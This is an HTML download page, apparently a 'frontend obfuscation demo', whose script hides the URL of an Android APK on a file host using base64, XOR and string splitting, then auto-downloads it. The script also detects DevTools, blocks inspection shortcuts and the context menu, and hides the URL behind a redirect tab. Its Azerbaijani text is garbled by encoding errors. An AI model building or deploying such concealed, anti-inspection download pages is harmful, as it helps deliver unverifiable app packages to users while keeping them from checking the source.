<!doctype html>
<html lang="az">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>âš¡ UltraSecure Download â€¢ Cesicoder</title>

<!-- Modern fonts -->
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
:root{
  --bg-1: #04050a;
  --accent1: #7c5cff;
  --accent2: #12c2e9;
  --muted: #9aa4b2;
  --card: rgba(255,255,255,0.03);
  --radius:18px;
}
*{box-sizing:border-box}
html,body{height:100%}
body{
  margin:0; font-family:"Poppins","Inter",system-ui, -apple-system, "Segoe UI", Roboto;
  background:
    radial-gradient(700px 350px at 10% 12%, rgba(124,92,255,0.14), transparent),
    radial-gradient(600px 300px at 92% 88%, rgba(18,194,233,0.06), transparent),
    linear-gradient(180deg,#020306,var(--bg-1));
  color:#e9f0ff; -webkit-font-smoothing:antialiased; padding:28px;
}

/* layout */
.container{max-width:1100px;margin:20px auto;display:grid;grid-template-columns:1fr 420px;gap:22px}
@media (max-width:980px){ .container{grid-template-columns:1fr;padding:12px} .side{order:2} }

.card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); padding:22px;border-radius:var(--radius);box-shadow:0 12px 50px rgba(2,6,23,0.6); border:1px solid rgba(255,255,255,0.04)}
.header{display:flex;gap:16px;align-items:center}
.logo{
  width:72px;height:72px;border-radius:16px;display:flex;align-items:center;justify-content:center;
  background:linear-gradient(135deg,var(--accent1),var(--accent2));font-weight:900;font-size:30px;box-shadow:0 12px 40px rgba(124,92,255,0.12);
}
.title{font-size:20px;font-weight:800;margin:0}
.subtitle{color:var(--muted);font-size:13px;margin-top:6px}

/* hero */
.hero .big{font-size:22px;font-weight:800;margin-top:12px}
.lead{color:var(--muted);margin-top:8px;font-size:14px}

/* controls */
.controls{display:flex;gap:12px;margin-top:18px;flex-wrap:wrap}
.btn{
  padding:12px 16px;border-radius:12px;border:0;cursor:pointer;font-weight:800;
  box-shadow:0 8px 24px rgba(2,6,23,0.6); transition:transform .12s, box-shadow .12s;
}
.btn:active{transform:translateY(2px)}
.btn-primary{background:linear-gradient(90deg,var(--accent1),var(--accent2));color:white}
.btn-ghost{background:transparent;border:1px solid rgba(255,255,255,0.04);color:var(--muted)}

/* info */
.info-row{display:flex;gap:10px;align-items:center;margin-top:12px;flex-wrap:wrap}
.chip{background:rgba(255,255,255,0.02);padding:8px 10px;border-radius:999px;color:var(--muted);font-weight:700;font-size:13px;display:inline-flex;gap:8px;align-items:center}

/* progress */
.progress{height:12px;background:rgba(255,255,255,0.02);border-radius:999px;margin-top:14px;overflow:hidden}
.bar{height:100%;width:0%;background:linear-gradient(90deg,var(--accent1),var(--accent2));transition:width .12s linear}

/* right side */
.side .card{display:flex;flex-direction:column;gap:12px}
video{width:100%;border-radius:14px;background:black;border:1px solid rgba(255,255,255,0.03)}
.socials{display:flex;gap:10px;flex-wrap:wrap}
.social{display:inline-flex;align-items:center;gap:10px;padding:10px 12px;border-radius:12px;background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.03);cursor:pointer;font-weight:800}

/* blobs */
.blob{position:fixed;right:-120px;top:-80px;width:420px;height:420px;border-radius:48%;filter:blur(60px);opacity:0.12;background:linear-gradient(135deg,var(--accent1),var(--accent2));transform:rotate(10deg);pointer-events:none;z-index:0}
.blob2{left:-160px;bottom:-100px;width:360px;height:360px;background:linear-gradient(135deg,#12c2e9,#7c5cff);filter:blur(40px);opacity:0.08;pointer-events:none}

/* minor */
.footer{margin-top:20px;color:var(--muted);font-size:13px;text-align:center}
.warn{color:#ffd9d9;font-size:13px;padding:10px;border-radius:12px;background:rgba(255,0,0,0.03);border:1px solid rgba(255,0,0,0.04);margin-top:12px}
.small{font-size:13px;color:var(--muted)}
</style>
</head>
<body>
  <div class="blob"></div>
  <div class="blob2"></div>

  <div class="container">
    <div class="card hero">
      <div class="header">
        <div class="logo">â˜„ï¸</div>
        <div>
          <div class="title">UltraSecure Download Hub</div>
          <div class="subtitle">Frontend obfuskasiya â€¢ Auto-download â€¢ YouTube & IG</div>
        </div>
      </div>

      <div class="big">FaylÄ± dÉ™rhal cihazÄ±na endir â€” link kodda parÃ§alanÄ±b, oxunmasÄ± Ã§É™tindir ğŸ”</div>
      <div class="lead">Frontend-only: mÃ¼mkÃ¼n olan É™n yaxÅŸÄ± gizlÉ™tmÉ™ vÉ™ anti-inspect tÉ™dbirlÉ™ri tÉ™tbiq edildi. Tam server-istifadÉ™si olmazsa 100% gizlÉ™tmÉ™ mÃ¼mkÃ¼n deyil.</div>

      <div class="controls">
        <button id="btnDownload" class="btn btn-primary">ğŸ“¥ Ä°NDÄ°R Ä°NDÄ°</button>
        <button id="btnRetry" class="btn btn-ghost">â™»ï¸ YenidÉ™n cÉ™hd et</button>
        <button id="btnPlay" class="btn btn-ghost">â–¶ Tutorial OYNAT</button>
      </div>

      <div class="info-row">
        <div class="chip">ğŸ“ <span id="fName">â€”</span></div>
        <div class="chip">âš–ï¸ <span id="fSize">â€”</span></div>
        <div class="chip">ğŸ”’ Obfuskasiya: Base64 + XOR + Split</div>
      </div>

      <div class="progress"><div id="bar" class="bar"></div></div>
      <div id="devWarn" class="warn" style="display:none">DevTools aÅŸkarlandÄ±! TÉ™hlÃ¼kÉ™sizlik sÉ™bÉ™bi ilÉ™ funksiyalar mÉ™hdudlaÅŸdÄ±rÄ±ldÄ±.</div>

      <div style="margin-top:12px" class="small">Qeyd: Video Ã¼Ã§Ã¼n `vd.mp4` faylÄ±nÄ± eyni qovluÄŸa qoy.</div>
    </div>

    <div class="side card">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <div>
          <strong>Tutorial</strong>
          <div class="small">vd.mp4 â€” sÉ™hifÉ™dÉ™ oynanÄ±r</div>
        </div>
        <div class="chip">ğŸ”’ View-only</div>
      </div>

      <video id="tutorial" controls controlsList="nodownload nofullscreen noremoteplayback" playsinline webkit-playsinline>
        <source id="vidSrc" src="vd.mp4" type="video/mp4">
        Sizin brauzer video elementini dÉ™stÉ™klÉ™mir.
      </video>

      <div style="display:flex;justify-content:space-between;align-items:center">
        <div class="socials">
          <div id="btnYT" class="social">â–¶ï¸ YouTube</div>
          <div id="btnIG" class="social">ğŸ“¸ Instagram</div>
        </div>
        <div class="small">Created by <strong>Cesicoder</strong> â€¢ 2025</div>
      </div>
    </div>
  </div>

  <div class="footer">Â© Cesicoder â€” Frontend obfuskasiya demo. Fayl mÃ¼É™llif hÃ¼ququna hÃ¶rmÉ™t et.</div>

<script>
/* ========================================================
   FULL, ERROR-FREE OBFUSCATION + DECODE FLOW
   Steps:
   1) base64(originalURL) --> split into parts
   2) each part XORed with keyBytes --> hex strings (stored in 'parts' array)
   3) decode: hex->bytes -> XOR with key -> join -> base64 string
   4) atob(base64) ==> REAL_URL  (no decodeURIComponent)
   ======================================================== */

/* ---------- XOR key (hex) ---------- */
const xorKeyHex = "5a1f3b7c"; // hex key
function hexToBytes(hex) {
  const bytes = [];
  for (let c = 0; c < hex.length; c += 2) bytes.push(parseInt(hex.substr(c, 2), 16));
  return bytes;
}
function bytesToStr(bytes){
  return bytes.map(b => String.fromCharCode(b)).join('');
}

/* ---------- OBFS PARTS: hex-encoded xored bytes ----------
   These parts were produced by:
     base64 = "aHR0cHM6Ly93d3cubWVkaWFmaXJlLmNvbS9maWxlLzY2ZnBpMGhjZ3h0cnR0bC9iYXNlLmFway9maWxl"
   split into 8-char pieces and XORed with key hex 5a1f3b7c
------------------------------------------------------------*/
const parts = [
  "3b57694c3957764a",
  "1666024f3e2c5809",
  "38486d173b487d11",
  "3b4771101672750a",
  "384c02113b484310",
  "1665624e0071790c",
  "17585316002c534c",
  "3971694c385c0215",
  "0347751016727d0b",
  "3b6602113b484310"
];

/* ---------- decode function (safe: no decodeURIComponent) ---------- */
function decodeRealUrl(partsArr, xorHex){
  try{
    const keyBytes = hexToBytes(xorHex);
    const base64Chunks = partsArr.map(hexChunk => {
      // hex -> bytes
      const bytes = hexToBytes(hexChunk);
      // XOR back
      const xored = bytes.map((b, i) => b ^ keyBytes[i % keyBytes.length]);
      return bytesToStr(xored);
    }).join('');
    // Now base64Chunks is the original base64 string
    const real = atob(base64Chunks); // atob returns the original URL string (safe ASCII)
    return real;
  }catch(e){
    console.error("Decode failed", e);
    return "";
  }
}

/* ---------- produce REAL_URL ---------- */
const REAL_URL = decodeRealUrl(parts, xorKeyHex);

/* ---------- update filename display if possible ---------- */
(function setFileName(){
  try{
    if(!REAL_URL) return;
    const u = new URL(REAL_URL);
    const pathParts = u.pathname.split('/').filter(Boolean);
    const last = pathParts[pathParts.length - 1] || "download.bin";
    document.getElementById('fName').textContent = last;
  }catch(e){}
})();

/* ========== simple DevTools detection ========== */
let devtoolsOpen = false;
(function detectDevTools(){
  const threshold = 160;
  const warnEl = document.getElementById('devWarn');
  setInterval(function(){
    const widthThreshold = window.outerWidth - window.innerWidth > threshold;
    const heightThreshold = window.outerHeight - window.innerHeight > threshold;
    const open = widthThreshold || heightThreshold;
    if(open !== devtoolsOpen){
      devtoolsOpen = open;
      warnEl.style.display = open ? "block" : "none";
    }
    // debugger timing trick
    const start = performance.now();
    debugger;
    const delta = performance.now() - start;
    if(delta > 100 && !devtoolsOpen){
      devtoolsOpen = true;
      warnEl.style.display = "block";
    }
  }, 1000);
})();

/* ========== block casual inspect & context menu ========== */
document.addEventListener('keydown', function(e){
  // F12 or Ctrl+Shift+I / Ctrl+Shift+J / Ctrl+U
  if(e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) || (e.ctrlKey && e.key === "U")){
    e.preventDefault();
    alert("Inspect bloklandÄ±.");
    return false;
  }
}, false);
document.addEventListener('contextmenu', function(e){
  // block on critical elements
  if(e.target.closest('video') || e.target.closest('.card')) e.preventDefault();
});

/* ========== long-press block on touch devices ========== */
let touchTimer = null;
document.addEventListener('touchstart', (e)=>{
  if(e.target.closest('video') || e.target.closest('.card')){
    touchTimer = setTimeout(()=>{}, 600);
  }
});
document.addEventListener('touchend', ()=>{ if(touchTimer) clearTimeout(touchTimer); });

/* ========== Download logic: try fetch->blob, show progress ========== */
const btn = document.getElementById('btnDownload');
const retry = document.getElementById('btnRetry');
const bar = document.getElementById('bar');

async function fetchAndDownload(url){
  if(devtoolsOpen){
    alert("GÃ¼vÉ™nlik sÉ™bÉ™bi ilÉ™ É™mÉ™liyyat bloklandÄ±.");
    return;
  }
  bar.style.width = "6%";
  try{
    const resp = await fetch(url, {method: "GET", mode: "cors", credentials: "omit"});
    if(!resp.ok) throw new Error("Server cavab vermÉ™di: " + resp.status);
    const len = resp.headers.get('Content-Length');
    if(len) document.getElementById('fSize').textContent = (Math.round(len/1024/1024*10)/10) + " MB";
    const reader = resp.body.getReader();
    const chunks = [];
    let received = 0;
    while(true){
      const {done, value} = await reader.read();
      if(done) break;
      chunks.push(value);
      received += value.length;
      if(len){
        const pct = Math.min(99, Math.round((received / parseInt(len,10)) * 100));
        bar.style.width = pct + "%";
      } else {
        bar.style.width = Math.min(94, (6 + Math.floor(received / 200000))) + "%";
      }
    }
    const blob = new Blob(chunks);
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    // filename from UI
    const fname = document.getElementById('fName').textContent || "download.bin";
    a.download = fname;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(a.href);
    bar.style.width = "100%";
    setTimeout(()=> bar.style.width = "0%", 1200);
  }catch(err){
    console.warn("fetch error:", err);
    // fallback: open new tab with a client-side redirect page (keeps original URL out of this page's DOM)
    try{
      const w = window.open("", "_blank");
      if(!w){
        alert("Pop-up blocklandÄ±. Brauzer popup-larÄ±na icazÉ™ ver vÉ™ yenidÉ™n cÉ™hd et.");
        return;
      }
      // small redirect page
      const redirectHtml = `
        <!doctype html><meta charset="utf-8"><title>Redirectingâ€¦</title>
        <p style="font-family:Inter,Arial">Redirectingâ€¦ If nothing happens, tap the link below.</p>
        <a id="rl" href="${url}">Open file</a>
        <script>location.replace(${JSON.stringify(url)});</script>
      `;
      w.document.open();
      w.document.write(redirectHtml);
      w.document.close();
    }catch(e){
      alert("EndirmÉ™ mÃ¼mkÃ¼n olmadÄ±: " + e.message);
    }
  }
}

/* button handlers */
btn.addEventListener('click', function(e){
  e.preventDefault();
  if(!REAL_URL){ alert("Decode xÉ™tasÄ± â€” REAL_URL mÃ¶vcud deyil."); return; }
  btn.disabled = true; btn.textContent = "ğŸ‘· YÃ¼klÉ™nir...";
  fetchAndDownload(REAL_URL).finally(()=>{ btn.disabled = false; btn.textContent = "ğŸ“¥ Ä°NDÄ°R Ä°NDÄ°"; });
});
retry.addEventListener('click', function(){ bar.style.width = "2%"; alert("SÄ±fÄ±rlandÄ± â€” yenidÉ™n cÉ™hd edin."); });

/* play tutorial button */
document.getElementById('btnPlay').addEventListener('click', ()=>{
  const vid = document.getElementById('tutorial');
  vid.play().catch(()=> alert("Autoplay bloklandÄ± â€” manual play dÃ¼ymÉ™sinÉ™ basÄ±n."));
});

/* socials */
document.getElementById('btnYT').addEventListener('click', ()=> window.open("https://youtube.com/@cesicoder","_blank"));
document.getElementById('btnIG').addEventListener('click', ()=> window.open("https://instagram.com/cesicoder","_blank"));
</script>
</body>
</html>